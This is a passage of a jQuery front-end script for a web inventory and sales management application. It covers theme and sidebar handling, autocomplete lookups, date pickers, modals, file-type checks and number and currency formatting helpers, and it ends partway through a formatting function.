$(window).load(function () {
    $("#loading").fadeOut("slow");
});
function cssStyle() {
    if ($.cookie('sma_style') == 'light') {
        $('link[href="' + site.base_url + 'themes/default/assets/styles/blue.css"]').attr('disabled', 'disabled');
        $('link[href="' + site.base_url + 'themes/default/assets/styles/blue.css"]').remove();
        $('<link>')
                .appendTo('head')
                .attr({type: 'text/css', rel: 'stylesheet'})
                .attr('href', site.base_url + 'themes/default/assets/styles/light.css');
    } else if ($.cookie('sma_style') == 'blue') {
        $('link[href="' + site.base_url + 'themes/default/assets/styles/light.css"]').attr('disabled', 'disabled');
        $('link[href="' + site.base_url + 'themes/default/assets/styles/light.css"]').remove();
        $('<link>')
                .appendTo('head')
                .attr({type: 'text/css', rel: 'stylesheet'})
                .attr('href', '' + site.base_url + 'themes/default/assets/styles/blue.css');
    } else {
        $('link[href="' + site.base_url + 'themes/default/assets/styles/light.css"]').attr('disabled', 'disabled');
        $('link[href="' + site.base_url + 'themes/default/assets/styles/blue.css"]').attr('disabled', 'disabled');
        $('link[href="' + site.base_url + 'themes/default/assets/styles/light.css"]').remove();
        $('link[href="' + site.base_url + 'themes/default/assets/styles/blue.css"]').remove();
    }

    if ($('#sidebar-left').hasClass('minified')) {
        $.cookie('sma_theme_fixed', 'no', {path: '/'});
        $('#content, #sidebar-left, #header').removeAttr("style");
        $('#sidebar-left').removeClass('sidebar-fixed');
        $('#content').removeClass('content-with-fixed');
        $('#fixedText').text('Fixed');
        $('#main-menu-act').addClass('full visible-md visible-lg').show();
        $('#fixed').removeClass('fixed');
    } else {
        if (site.settings.rtl == 1) {
            $.cookie('sma_theme_fixed', 'no', {path: '/'});
        }
        if ($.cookie('sma_theme_fixed') == 'yes') {
            // $('#content').css('margin-left', $('#sidebar-left').outerWidth(true)).css('margin-top', '40px');
            $('#content').addClass('content-with-fixed');
            $('#sidebar-left').addClass('sidebar-fixed').css('height', $(window).height() - 80);
            $('#header').css('position', 'fixed').css('top', '0').css('width', '100%');
            $('#fixedText').text('Static');
            $('#main-menu-act').removeAttr("class").hide();
            $('#fixed').addClass('fixed');
            $("#sidebar-left").css("overflow", "hidden");
            $('#sidebar-left').perfectScrollbar({suppressScrollX: true});
        } else {
            $('#content, #sidebar-left, #header').removeAttr("style");
            $('#sidebar-left').removeClass('sidebar-fixed');
            $('#content').removeClass('content-with-fixed');
            $('#fixedText').text('Fixed');
            $('#main-menu-act').addClass('full visible-md visible-lg').show();
            $('#fixed').removeClass('fixed');
            $('#sidebar-left').perfectScrollbar('destroy');
        }
    }
    widthFunctions();
}
$('#csv_file').change(function (e) {
    v = $(this).val();
    if (v != '') {
        var validExts = new Array(".xlsx");
        var fileExt = v;
        fileExt = fileExt.substring(fileExt.lastIndexOf('.'));
        if (validExts.indexOf(fileExt) < 0) {
            e.preventDefault();
            bootbox.alert("Invalid file selected. Only .xlsx file is allowed.");
            $(this).val('');
            $(this).fileinput('clear');
            $('form[data-toggle="validator"]').bootstrapValidator('updateStatus', 'csv_file', 'NOT_VALIDATED');
            return false;
        } else
            return true;
    }
});
// bulk deposit
$('#deposit_file').change(function (e) {
    v = $(this).val();
    if (v != '') {
        var validExts = new Array(".xlsx,.xls");
        var fileExt = v;
        fileExt = fileExt.substring(fileExt.lastIndexOf('.'));
        if (validExts.indexOf(fileExt) < 0) {
            e.preventDefault();
            bootbox.alert("Invalid file selected. Only .xlsx file is allowed.");
            $(this).val('');
            $(this).fileinput('clear');
            $('form[data-toggle="validator"]').bootstrapValidator('updateStatus', 'deposit_file', 'NOT_VALIDATED');
            return false;
        } else
            return true;
    }
});
$(document).ready(function () {
    // $('.form-control').attr('autocomplete', 'off');
    $("#suggest_product").autocomplete({
        source: site.base_url + 'reports/suggestions',
        select: function (event, ui) {
            $('#report_product_id').val(ui.item.id);
        },
        minLength: 1,
        autoFocus: false,
        delay: 250,
        response: function (event, ui) {
            if (ui.content != null) {
                if (ui.content.length == 1 && ui.content[0].id != 0) {
                    ui.item = ui.content[0];
                    $(this).val(ui.item.label);
                    $(this).data('ui-autocomplete')._trigger('select', 'autocompleteselect', ui);
                    $(this).autocomplete('close');
                    $(this).removeClass('ui-autocomplete-loading');
                }
            } else {
                bootbox.alert("Product name not found.");
                $('#suggest_product').val('');
            }
        },
    });
    $(document).on('blur', '#suggest_product', function (e) {
        if (!$(this).val()) {
            $('#report_product_id').val('');
        }
    });
    $('#random_num').click(function () {
        $(this).parent('.input-group').children('input').val(generateCardNo(8));
    });
    $('#toogle-customer-read-attr').click(function () {
        var icus = $(this).closest('.input-group').find("input[name='customer']");
        var nst = icus.is('[readonly]') ? false : true;
        icus.select2("readonly", nst);
        return false;
    });
    $('.top-menu-scroll').perfectScrollbar();
    $('#fixed').click(function (e) {
        e.preventDefault();
        if ($('#sidebar-left').hasClass('minified')) {
            bootbox.alert('Unable to fix minified sidebar');
        } else {
            if ($(this).hasClass('fixed')) {
                $.cookie('sma_theme_fixed', 'no', {path: '/'});
            } else {
                $.cookie('sma_theme_fixed', 'yes', {path: '/'});
            }
            cssStyle();
        }
    });
    //$('.form-control').attr('autocomplete', 'off'); 
    $('form').attr('autocomplete', 'off');
});

function widthFunctions(e) {
    var l = $("#sidebar-left").outerHeight(true),
            c = $("#content").height(),
            co = $("#content").outerHeight(),
            h = $("header").height(),
            f = $("footer").height(),
            wh = $(window).height(),
            ww = $(window).width();
    if (ww < 992) {
        $("#main-menu-act").removeClass("minified").addClass("full").find("i").removeClass("fa-angle-double-right").addClass("fa-angle-double-left");
        $("body").removeClass("sidebar-minified");
        $("#content").removeClass("sidebar-minified");
        $("#sidebar-left").removeClass("minified")
        if ($.cookie('sma_theme_fixed') == 'yes') {
            $.cookie('sma_theme_fixed', 'no', {path: '/'});
            $('#content, #sidebar-left, #header').removeAttr("style");
            $("#sidebar-left").css("overflow-y", "visible");
            $('#fixedText').text('Fixed');
            $('#main-menu-act').addClass('full visible-md visible-lg').show();
            $('#fixed').removeClass('fixed');
            $('#sidebar-left').perfectScrollbar('destroy');
        }
    }
    if (ww < 998 && ww > 750) {
        $('#main-menu-act').hide();
        $("body").addClass("sidebar-minified");
        $("#content").addClass("sidebar-minified");
        $("#sidebar-left").addClass("minified");
        $(".dropmenu > .chevron").removeClass("opened").addClass("closed");
        $(".dropmenu").parent().find("ul").hide();
        $("#sidebar-left > div > ul > li > a > .chevron").removeClass("closed").addClass("opened");
        $("#sidebar-left > div > ul > li > a").addClass("open");
        $('#fixed').hide();
    }
    if (ww > 1024 && $.cookie('sma_sidebar') != 'minified') {
        $('#main-menu-act').removeClass("minified").addClass("full").find("i").removeClass("fa-angle-double-right").addClass("fa-angle-double-left");
        $("body").removeClass("sidebar-minified");
        $("#content").removeClass("sidebar-minified");
        $("#sidebar-left").removeClass("minified");
        $("#sidebar-left > div > ul > li > a > .chevron").removeClass("opened").addClass("closed");
        $("#sidebar-left > div > ul > li > a").removeClass("open");
        $('#fixed').show();
    }
    if ($.cookie('sma_theme_fixed') == 'yes') {
        $('#content').addClass('content-with-fixed');
        $('#sidebar-left').addClass('sidebar-fixed').css('height', $(window).height() - 80);
    }
    if (ww > 767) {
        wh - 80 > l && $("#sidebar-left").css("min-height", wh - h - f - 30);
        wh - 80 > c && $("#content").css("min-height", wh - h - f - 30);
    } else {
        $("#sidebar-left").css("min-height", "0px");
        $(".content-con").css("max-width", ww);
    }
    //$(window).scrollTop($(window).scrollTop() + 1);
}

jQuery(document).ready(function (e) {
    window.location.hash ? e('#myTab a[href="' + window.location.hash + '"]').tab('show') : e("#myTab a:first").tab("show");
    e("#myTab2 a:first, #dbTab a:first").tab("show");
    e("#myTab a, #myTab2 a, #dbTab a").click(function (t) {
        t.preventDefault();
        e(this).tab("show");
    });
    e('[rel="popover"],[data-rel="popover"],[data-toggle="popover"]').popover();
    e("#toggle-fullscreen").button().click(function () {
        var t = e(this),
                n = document.documentElement;
        if (!t.hasClass("active")) {
            e("#thumbnails").addClass("modal-fullscreen");
            n.webkitRequestFullScreen ? n.webkitRequestFullScreen(window.Element.ALLOW_KEYBOARD_INPUT) : n.mozRequestFullScreen && n.mozRequestFullScreen()
        } else {
            e("#thumbnails").removeClass("modal-fullscreen");
            (document.webkitCancelFullScreen || document.mozCancelFullScreen || e.noop).apply(document)
        }
    });
    e(".btn-close").click(function (t) {
        t.preventDefault();
        e(this).parent().parent().parent().fadeOut()
    });
    e(".btn-minimize").click(function (t) {
        t.preventDefault();
        var n = e(this).parent().parent().next(".box-content");
        n.is(":visible") ? e("i", e(this)).removeClass("fa-chevron-up").addClass("fa-chevron-down") : e("i", e(this)).removeClass("fa-chevron-down").addClass("fa-chevron-up");
        n.slideToggle("slow", function () {
            widthFunctions();
        })
    });
});

jQuery(document).ready(function (e) {
    e("#main-menu-act").click(function () {
        if (e(this).hasClass("full")) {
            $.cookie('sma_sidebar', 'minified', {path: '/'});
            e(this).removeClass("full").addClass("minified").find("i").removeClass("fa-angle-double-left").addClass("fa-angle-double-right");
            e("body").addClass("sidebar-minified");
            e("#content").addClass("sidebar-minified");
            e("#sidebar-left").addClass("minified");
            e(".dropmenu > .chevron").removeClass("opened").addClass("closed");
            e(".dropmenu").parent().find("ul").hide();
            e("#sidebar-left > div > ul > li > a > .chevron").removeClass("closed").addClass("opened");
            e("#sidebar-left > div > ul > li > a").addClass("open");
            $('#fixed').hide();
        } else {
            $.cookie('sma_sidebar', 'full', {path: '/'});
            e(this).removeClass("minified").addClass("full").find("i").removeClass("fa-angle-double-right").addClass("fa-angle-double-left");
            e("body").removeClass("sidebar-minified");
            e("#content").removeClass("sidebar-minified");
            e("#sidebar-left").removeClass("minified");
            e("#sidebar-left > div > ul > li > a > .chevron").removeClass("opened").addClass("closed");
            e("#sidebar-left > div > ul > li > a").removeClass("open");
            $('#fixed').show();
        }
        return false;
    });
    e(".dropmenu").click(function (t) {
        t.preventDefault();
        if (e("#sidebar-left").hasClass("minified")) {
            if (!e(this).hasClass("open")) {
                e(this).parent().find("ul").first().slideToggle();
                e(this).find(".chevron").hasClass("closed") ? e(this).find(".chevron").removeClass("closed").addClass("opened") : e(this).find(".chevron").removeClass("opened").addClass("closed")
            }
        } else {
            e(this).parent().find("ul").first().slideToggle();
            e(this).find(".chevron").hasClass("closed") ? e(this).find(".chevron").removeClass("closed").addClass("opened") : e(this).find(".chevron").removeClass("opened").addClass("closed")
        }
    });
    if (e("#sidebar-left").hasClass("minified")) {
        e("#sidebar-left > div > ul > li > a > .chevron").removeClass("closed").addClass("opened");
        e("#sidebar-left > div > ul > li > a").addClass("open");
        e("body").addClass("sidebar-minified")
    }
});

$(document).ready(function () {
    cssStyle();
    $('select, .select').select2({minimumResultsForSearch: 7});
    $('#customer, #rcustomer').select2({
        minimumInputLength: 1,
        ajax: {
            url: site.base_url + "customers/suggestions",
            dataType: 'json',
            quietMillis: 15,
            data: function (term, page) {
                return {
                    term: term,
                    limit: 10
                };
            },
            results: function (data, page) {
                if (data.results != null) {
                    return {results: data.results};
                } else {
                    return {results: [{id: '', text: 'No Match Found'}]};
                }
            }
        }
    });
    $('#supplier, #rsupplier, .rsupplier').select2({
        minimumInputLength: 1,
        ajax: {
            url: site.base_url + "suppliers/suggestions",
            dataType: 'json',
            quietMillis: 15,
            data: function (term, page) {
                return {
                    term: term,
                    limit: 10
                };
            },
            results: function (data, page) {
                if (data.results != null) {
                    return {results: data.results};
                } else {
                    return {results: [{id: '', text: 'No Match Found'}]};
                }
            }
        }
    });
    $('.input-tip').tooltip({placement: 'top', html: true, trigger: 'hover focus', container: 'body',
        title: function () {
            return $(this).attr('data-tip');
        }
    });
    $('.input-pop').popover({placement: 'top', html: true, trigger: 'hover', container: 'body',
        content: function () {
            return $(this).attr('data-tip');
        },
        title: function () {
            return '<b>' + $('label[for="' + $(this).attr('id') + '"]').text() + '</b>';
        }
    });
});

$(document).on('click', '*[data-toggle="lightbox"]', function (event) {
    event.preventDefault();
    $(this).ekkoLightbox();
});
$(document).on('click', '*[data-toggle="popover"]', function (event) {
    event.preventDefault();
    $(this).popover();
});

$(document).ajaxStart(function () {
    $('#ajaxCall').show();
}).ajaxStop(function () {
    $('#ajaxCall').hide();
});

$(document).ready(function () {
    $('input[type="checkbox"],[type="radio"]').not('.skip').iCheck({
        checkboxClass: 'icheckbox_square-blue',
        radioClass: 'iradio_square-blue',
        increaseArea: '20%'
    });
    $('textarea').not('.skip').redactor({
        buttons: ['formatting', '|', 'alignleft', 'aligncenter', 'alignright', 'justify', '|', 'bold', 'italic', 'underline', '|', 'unorderedlist', 'orderedlist', '|', 'image', /*'video',*/ 'link', '|', 'html'],
        formattingTags: ['p', 'pre', 'h3', 'h4'],
        minHeight: 100,
        changeCallback: function (e) {
            var editor = this.$editor.next('textarea');
            if ($(editor).attr('required')) {
                $('form[data-toggle="validator"]').bootstrapValidator('revalidateField', $(editor).attr('name'));
            }
        }
    });
    $(document).on('click', '.file-caption', function () {
        $(this).next('.input-group-btn').children('.btn-file').children('input.file').trigger('click');
    });
});

function suppliers(ele) {
    $(ele).select2({
        minimumInputLength: 1,
        ajax: {
            url: site.base_url + "suppliers/suggestions",
            dataType: 'json',
            quietMillis: 15,
            data: function (term, page) {
                return {
                    term: term,
                    limit: 10
                };
            },
            results: function (data, page) {
                if (data.results != null) {
                    return {results: data.results};
                } else {
                    return {results: [{id: '', text: 'No Match Found'}]};
                }
            }
        }
    });
}

$(function () {
    $('.datetime').datetimepicker({format: site.dateFormats.js_ldate, fontAwesome: true, language: 'sma', weekStart: 1, todayBtn: 1, autoclose: 1, todayHighlight: 1, startView: 2, forceParse: 0});
    $('.date').datetimepicker({format: site.dateFormats.js_sdate, fontAwesome: true, language: 'sma', todayBtn: 1, autoclose: 1, minView: 2});
    $(document).on('focus', '.date', function (t) {
        $(this).datetimepicker({format: site.dateFormats.js_sdate, fontAwesome: true, todayBtn: 1, autoclose: 1, minView: 2});
    });
    $(document).on('focus', '.datetime', function () {
        $(this).datetimepicker({format: site.dateFormats.js_ldate, fontAwesome: true, weekStart: 1, todayBtn: 1, autoclose: 1, todayHighlight: 1, startView: 2, forceParse: 0});
    });
});

$(document).ready(function () {
    $('#dbTab a').on('shown.bs.tab', function (e) {
        var newt = $(e.target).attr('href');
        var oldt = $(e.relatedTarget).attr('href');
        $(oldt).hide();
        //$(newt).hide().fadeIn('slow');
        $(newt).hide().slideDown('slow');
    });
    $('.dropdown').on('show.bs.dropdown', function (e) {
        $(this).find('.dropdown-menu').first().stop(true, true).slideDown('fast');
    });
    $('.dropdown').on('hide.bs.dropdown', function (e) {
        $(this).find('.dropdown-menu').first().stop(true, true).slideUp('fast');
    });
    $('.hideComment').click(function () {
        $.ajax({url: site.base_url + 'welcome/hideNotification/' + $(this).attr('id')});
    });
    $('.tip').tooltip();
    $('body').on('click', '#delete', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form').submit();
    });
    $('body').on('click', '#sync_quantity', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });
    $('body').on('click', '#excel', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });
    $('body').on('click', '#pdf', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });

     $('body').on('click', '#fav_products', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });

    $('body').on('click', '#labelProducts', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });
    $('body').on('click', '#barcodeProducts', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });
    $('body').on('click', '#combine', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });

    $('body').on('click', '#combine_invoice', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });

     $('body').on('click', '#export_invoice_to_excel', function(e) {
         e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });
    $('body').on('click', '#export_to_json', function(e) {
        e.preventDefault();
       $('#form_action').val($(this).attr('data-action'));
       $('#action-form-submit').trigger('click');
   });
//    $('body').on('click', '#abcd', function(e) {
//     alert();
//     exit();
//     e.preventDefault();
//    $('#form_action').val($(this).attr('data-action'));
//    $('#action-form-submit').trigger('click');
// });
});

$(document).ready(function () {
    $('#product-search').click(function () {
        $('#product-search-form').submit();
    });
    //feedbackIcons:{valid: 'fa fa-check',invalid: 'fa fa-times',validating: 'fa fa-refresh'},
    $('form[data-toggle="validator"]').bootstrapValidator({message: 'Please enter/select a value', submitButtons: 'input[type="submit"]'});
    fields = $('.form-control');
    $.each(fields, function () {
        var id = $(this).attr('id');
        var iname = $(this).attr('name');
        var iid = '#' + id;
        if (!!$(this).attr('data-bv-notempty') || !!$(this).attr('required')) {
            $("label[for='" + id + "']").append(' *');
            $(document).on('change', iid, function () {
                $('form[data-toggle="validator"]').bootstrapValidator('revalidateField', iname);
            });
        }
    });
    $('body').on('click', 'label', function (e) {
        var field_id = $(this).attr('for');
        if (field_id) {
            if ($("#" + field_id).hasClass('select')) {
                $("#" + field_id).select2("open");
                return false;
            }
        }
    });
    $('body').on('focus', 'select', function (e) {
        var field_id = $(this).attr('id');
        if (field_id) {
            if ($("#" + field_id).hasClass('select')) {
                $("#" + field_id).select2("open");
                return false;
            }
        }
    });
    $('#myModal').on('hidden.bs.modal', function () {
        $(this).find('.modal-dialog').empty();
        //$(this).find('#myModalLabel').empty().html('&nbsp;');
        //$(this).find('.modal-body').empty().text('Loading...');
        //$(this).find('.modal-footer').empty().html('&nbsp;');
        $(this).removeData('bs.modal');
    });
    $('#myModal2').on('hidden.bs.modal', function () {
        $(this).find('.modal-dialog').empty();
        //$(this).find('#myModalLabel').empty().html('&nbsp;');
        //$(this).find('.modal-body').empty().text('Loading...');
        //$(this).find('.modal-footer').empty().html('&nbsp;');
        $(this).removeData('bs.modal');
        $('#myModal').css('zIndex', '1050');
        $('#myModal').css('overflow-y', 'scroll');
    });
    $('#myModal2').on('show.bs.modal', function () {
        $('#myModal').css('zIndex', '1040');
    });
    $('.modal').on('show.bs.modal', function () {
        $('#modal-loading').show();
        $('.blackbg').css('zIndex', '1041');
        $('.loader').css('zIndex', '1042');
    }).on('hide.bs.modal', function () {
        $('#modal-loading').hide();
        $('.blackbg').css('zIndex', '3');
        $('.loader').css('zIndex', '4');
    });
    $(document).on('click', '.po', function (e) {
        e.preventDefault();
        $('.po').popover({html: true, placement: 'left', trigger: 'manual'}).popover('show').not(this).popover('hide');
        return false;
    });
    $(document).on('click', '.po-close', function () {
        $('.po').popover('hide');
        return false;
    });
    $(document).on('click', '.po-delete', function (e) {
        var row = $(this).closest('tr');
        e.preventDefault();
        $('.po').popover('hide');
        var link = $(this).attr('href');
        var return_id = $(this).attr('data-return-id');
        $.ajax({type: "get", url: link,
            success: function (data) {
                $('#' + return_id).remove();
                row.remove();
                if (data) {
                    addAlert(data, 'success');
                }
            },
            error: function (data) {
                addAlert('Failed', 'danger');
            }
        });
        return false;
    });
    $(document).on('click', '.po-delete1', function (e) {
        e.preventDefault();
        $('.po').popover('hide');
        var link = $(this).attr('href');
        var s = $(this).attr('id');
        var sp = s.split('__')
        $.ajax({type: "get", url: link,
            success: function (data) {
                if (data) {
                    addAlert(data, 'success');
                }
                $('#' + sp[1]).remove();
            },
            error: function (data) {
                addAlert('Failed', 'danger');
            }
        });
        return false;
    });
    $('body').on('click', '.bpo', function (e) {
        e.preventDefault();
        $(this).popover({html: true, trigger: 'manual'}).popover('toggle');
        return false;
    });
    $('body').on('click', '.bpo-close', function (e) {
        $('.bpo').popover('hide');
        return false;
    });
    $('#genNo').click(function () {
        var no = generateCardNo();
        $(this).parent().parent('.input-group').children('input').val(no);
        return false;
    });
    $('#inlineCalc').calculator({layout: ['_%+-CABS', '_7_8_9_/', '_4_5_6_*', '_1_2_3_-', '_0_._=_+'], showFormula: true});
    $('.calc').click(function (e) {
        e.stopPropagation();
    });
    $(document).on('click', '.sname', function (e) {
        var row = $(this).closest('tr');
        var itemid = row.find('.rid').val();
        $('#myModal').modal({remote: site.base_url + 'products/modal_view/' + itemid});
        $('#myModal').modal('show');
    });
});

function addAlert(message, type) {
    $('.alerts-con').empty().append(
            '<div class="alert alert-' + type + '">' +
            '<button type="button" class="close" data-dismiss="alert">' +
            '&times;</button>' + message + '</div>');
}

$(document).ready(function () {
    if ($.cookie('sma_sidebar') == 'minified') {
        $('#main-menu-act').removeClass("full").addClass("minified").find("i").removeClass("fa-angle-double-left").addClass("fa-angle-double-right");
        $("body").addClass("sidebar-minified");
        $("#content").addClass("sidebar-minified");
        $("#sidebar-left").addClass("minified");
        $(".dropmenu > .chevron").removeClass("opened").addClass("closed");
        $(".dropmenu").parent().find("ul").hide();
        $("#sidebar-left > div > ul > li > a > .chevron").removeClass("closed").addClass("opened");
        $("#sidebar-left > div > ul > li > a").addClass("open");
        $('#fixed').hide();
    } else {

        $('#main-menu-act').removeClass("minified").addClass("full").find("i").removeClass("fa-angle-double-right").addClass("fa-angle-double-left");
        $("body").removeClass("sidebar-minified");
        $("#content").removeClass("sidebar-minified");
        $("#sidebar-left").removeClass("minified");
        $("#sidebar-left > div > ul > li > a > .chevron").removeClass("opened").addClass("closed");
        $("#sidebar-left > div > ul > li > a").removeClass("open");
        $('#fixed').show();
    }
});

$(document).ready(function () {
    $('#daterange').daterangepicker({
        timePicker: true,
        format: (site.dateFormats.js_sdate).toUpperCase() + ' HH:mm',
        ranges: {
            'Today': [moment().hours(0).minutes(0).seconds(0), moment()],
            'Yesterday': [moment().subtract('days', 1).hours(0).minutes(0).seconds(0), moment().subtract('days', 1).hours(23).minutes(59).seconds(59)],
            'Last 7 Days': [moment().subtract('days', 6).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
            'Last 30 Days': [moment().subtract('days', 29).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
            'This Month': [moment().startOf('month').hours(0).minutes(0).seconds(0), moment().endOf('month').hours(23).minutes(59).seconds(59)],
            'Last Month': [moment().subtract('month', 1).startOf('month').hours(0).minutes(0).seconds(0), moment().subtract('month', 1).endOf('month').hours(23).minutes(59).seconds(59)]
        }
    },
            function (start, end) {
                refreshPage(start.format('YYYY-MM-DD HH:mm'), end.format('YYYY-MM-DD HH:mm'));
            });
});

function refreshPage(start, end) {
    window.location.replace(CURI + '/' + encodeURIComponent(start) + '/' + encodeURIComponent(end));
}

function retina() {
    retinaMode = window.devicePixelRatio > 1;
    return retinaMode
}

$(document).ready(function () {
    $('#cssLight').click(function (e) {
        e.preventDefault();
        $.cookie('sma_style', 'light', {path: '/'});
        cssStyle();
        return true;
    });
    $('#cssBlue').click(function (e) {
        e.preventDefault();
        $.cookie('sma_style', 'blue', {path: '/'});
        cssStyle();
        return true;
    });
    $('#cssBlack').click(function (e) {
        e.preventDefault();
        $.cookie('sma_style', 'black', {path: '/'});
        cssStyle();
        return true;
    });
    $("#toTop").click(function (e) {
        e.preventDefault();
        $("html, body").animate({scrollTop: 0}, 100);
    });
    $(document).on('click', '.delimg', function (e) {
        e.preventDefault();
        var ele = $(this), id = $(this).attr('data-item-id');
        bootbox.confirm(lang.r_u_sure, function (result) {
            if (result == true) {
                $.get(site.base_url + 'products/delete_image/' + id, function (data) {
                    if (data.error === 0) {
                        addAlert(data.msg, 'success');
                        ele.parent('.gallery-image').remove();
                    }
                });
            }
        });
        return false;
    });
});
$(document).ready(function () {
    $(document).on('click', '.row_status', function (e) {
        e.preventDefault;
        var row = $(this).closest('tr');
        var id = row.attr('id');
        if (row.hasClass('invoice_link')) {
            $('#myModal').modal({remote: site.base_url + 'sales/update_status/' + id});
            $('#myModal').modal('show');
        } else if (row.hasClass('purchase_link')) {
            $('#myModal').modal({remote: site.base_url + 'purchases/update_status/' + id});
            $('#myModal').modal('show');
        } else if (row.hasClass('quote_link')) {
            $('#myModal').modal({remote: site.base_url + 'quotes/update_status/' + id});
            $('#myModal').modal('show');
        } /*else if (row.hasClass('transfer_link')) {
            $('#myModal').modal({remote: site.base_url + 'transfers/update_status/' + id});
            $('#myModal').modal('show');
        }*/
        return false;
    });
});
/*
 $(window).scroll(function() {
 if ($(this).scrollTop()) {
 $('#toTop').fadeIn();
 } else {
 $('#toTop').fadeOut();
 }
 });
 */
$(document).on('ifChecked', '.checkth, .checkft', function (event) {
    $('.checkth, .checkft').iCheck('check');
    $('.multi-select').each(function () {
        $(this).iCheck('check');
    });
});
$(document).on('ifUnchecked', '.checkth, .checkft', function (event) {
    $('.checkth, .checkft').iCheck('uncheck');
    $('.multi-select').each(function () {
        $(this).iCheck('uncheck');
    });
});
$(document).on('ifUnchecked', '.multi-select', function (event) {
    $('.checkth, .checkft').attr('checked', false);
    $('.checkth, .checkft').iCheck('update');
});

function check_add_item_val() {
    $('#add_item').bind('keypress', function (e) {
        if (e.keyCode == 13 || e.keyCode == 9) {
            e.preventDefault();
            // $(this).autocomplete("search");
        }
    });
}
function fld(oObj) {
    if (oObj != null) {
        var aDate = oObj.split('-');
        var bDate = aDate[2].split(' ');
        year = aDate[0], month = aDate[1], day = bDate[0], time = bDate[1];
        if (site.dateFormats.js_sdate == 'dd-mm-yyyy')
            return day + "-" + month + "-" + year + " " + time;
        else if (site.dateFormats.js_sdate === 'dd/mm/yyyy')
            return day + "/" + month + "/" + year + " " + time;
        else if (site.dateFormats.js_sdate == 'dd.mm.yyyy')
            return day + "." + month + "." + year + " " + time;
        else if (site.dateFormats.js_sdate == 'mm/dd/yyyy')
            return month + "/" + day + "/" + year + " " + time;
        else if (site.dateFormats.js_sdate == 'mm-dd-yyyy')
            return month + "-" + day + "-" + year + " " + time;
        else if (site.dateFormats.js_sdate == 'mm.dd.yyyy')
            return month + "." + day + "." + year + " " + time;
        else
            return oObj;
    } else {
        return '';
    }
}

function fsd(oObj) {
    if (oObj != null) {
        var aDate = oObj.split('-');
        if (site.dateFormats.js_sdate == 'dd-mm-yyyy')
            return aDate[2] + "-" + aDate[1] + "-" + aDate[0];
        else if (site.dateFormats.js_sdate === 'dd/mm/yyyy')
            return aDate[2] + "/" + aDate[1] + "/" + aDate[0];
        else if (site.dateFormats.js_sdate == 'dd.mm.yyyy')
            return aDate[2] + "." + aDate[1] + "." + aDate[0];
        else if (site.dateFormats.js_sdate == 'mm/dd/yyyy')
            return aDate[1] + "/" + aDate[2] + "/" + aDate[0];
        else if (site.dateFormats.js_sdate == 'mm-dd-yyyy')
            return aDate[1] + "-" + aDate[2] + "-" + aDate[0];
        else if (site.dateFormats.js_sdate == 'mm.dd.yyyy')
            return aDate[1] + "." + aDate[2] + "." + aDate[0];
        else
            return oObj;
    } else {
        return '';
    }
}
function generateCardNo(x) {
    if (!x) {
        x = 16;
    }
    chars = "1234567890";
    no = "";
    for (var i = 0; i < x; i++) {
        var rnum = Math.floor(Math.random() * chars.length);
        no += chars.substring(rnum, rnum + 1);
    }
    return no;
}
function roundNumber(num, nearest) {
    if (!nearest) {
        nearest = 0.05;
    }
    return Math.round((num / nearest) * nearest);
}
function getNumber(x) {
    return accounting.unformat(x);
}
function formatQuantity(x) {
    return (x != null) ? '<div class="text-center">' + formatNumber(x, site.settings.qty_decimals) + '</div>' : '';
}
function formatQuantity2(x) {
    return (x != null) ? formatNumber(x, site.settings.qty_decimals) : '';
}
function formatNumber(x, d) {
    if (!d && d != 0) {
        d = site.settings.decimals;
    }
    if (site.settings.sac == 1) {
        return formatSA(parseFloat(x).toFixed(d));
    }
    return accounting.formatNumber(x, d, site.settings.thousands_sep == 0 ? ' ' : site.settings.thousands_sep, site.settings.decimals_sep);
}
function formatMoney(x, symbol) {
    if (!symbol) {
        symbol = "";
    }
    if (site.settings.sac == 1) {
        return (site.settings.display_symbol == 1 ? site.settings.symbol : '') +
                '' + (parseFloat(x).toFixed(site.settings.decimals)) +
                (site.settings.display_symbol == 2 ? site.settings.symbol : '');
    }
    var fmoney = accounting.formatMoney(x, symbol, site.settings.decimals, site.settings.thousands_sep == 0 ? ' ' : site.settings.thousands_sep, site.settings.decimals_sep, "%s%v");
    fmoney = (fmoney == '-0.00') ? '0.00' : fmoney; //convert -0.00 to 0.00
    return (site.settings.display_symbol == 1 ? site.settings.symbol : '') +
            fmoney +
            (site.settings.display_symbol == 2 ? site.settings.symbol : '');
}
function is_valid_discount(mixed_var) {
    return (is_numeric(mixed_var) || (/([0-9]%)/i.test(mixed_var))) ? true : false;
}
function is_numeric(mixed_var) {
    var whitespace =
            " \n\r\t\f\x0b\xa0\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u200b\u2028\u2029\u3000";
    return (typeof mixed_var === 'number' || (typeof mixed_var === 'string' && whitespace.indexOf(mixed_var.slice(-1)) === -
            1)) && mixed_var !== '' && !isNaN(mixed_var);
}
function is_float(mixed_var) {
    return +mixed_var === mixed_var && (!isFinite(mixed_var) || !!(mixed_var % 1));
}
function decimalFormat(x) {
    if (x != null) {
        return '<div class="text-center">' + formatNumber(x) + '</div>';
    } else {
        return '<div class="text-center">0</div>';
    }
}
function currencyFormat(x, format='') {
	if(format==''){
		if (x != null) {
			return '<div class="text-right">' + formatMoney(x) + '</div>';
		} else {
			return '<div class="text-right">0</div>';
		}
	}else{
		if (x != null) {
			return formatMoney(x);
		} else {
			return '0';
		}
	}
    
}
function formatDecimal(x, d) {
    if (!d) {
        d = site.settings.decimals;
    }
